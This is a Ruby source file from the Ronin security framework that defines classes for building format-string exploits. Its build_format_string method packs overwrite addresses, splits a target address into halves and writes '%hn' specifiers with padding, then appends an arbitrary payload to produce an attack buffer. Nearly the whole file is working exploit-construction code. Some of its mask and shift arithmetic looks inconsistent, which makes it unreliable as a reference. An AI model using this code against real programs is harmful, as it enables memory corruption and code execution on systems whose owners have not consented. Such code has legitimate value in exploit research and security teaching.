#
# Ronin - A decentralized repository for the storage and sharing of computer
# security advisories, exploits and payloads.
#
# Copyright (c) 2007 Hal Brodigan (postmodern at users.sourceforge.net)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'target'
require 'platformexploit'

module Ronin
  class FormatStringTarget < Target

    # Pop length
    attr_reader :pop_length

    # Address
    attr_reader :address

    # Overwrite
    attr_reader :overwrite

    def initialize(product_version,platform,pop_length,address,overwrite,comments=nil)
      super(product_version,platform,comments)
      @pop_length = pop_length 
      @address = address 
      @overwrite = overwrite
    end

  end

  class FormatString < PlatformExploit

    def initialize(advisory=nil)
      super(advisory)
    end

    def build_format_string(target=get_target,payload="")
      buffer = target.overwrite.pack(target.platform.arch)+(target.overwrite+(target.platform.arch.address_length/2)).pack(target.platform.arch)

      low_mask = 0xff
      (target.platform.arch.address_length/2).times do
	low_mask <<= 8
	low_mask |= 0xff
      end

      high_mask = low_mask << (target.platform.arch.address_length*4)
      high = (target.address & high_mask) >> (target.platform.arch.address_length/2)
      low = target.address & low_mask

      if low<high
	low-=(target.platform.arch.address_length*2)
	buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",low,target.pop_length,high-low,target.pop_length+1)
      else
	high-=(target.platform.arch.address_length*2)
	buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",high,target.pop_length+1,low-high,target.pop_length)
      end
      buffer+=payload

      return buffer
    end

  end
end
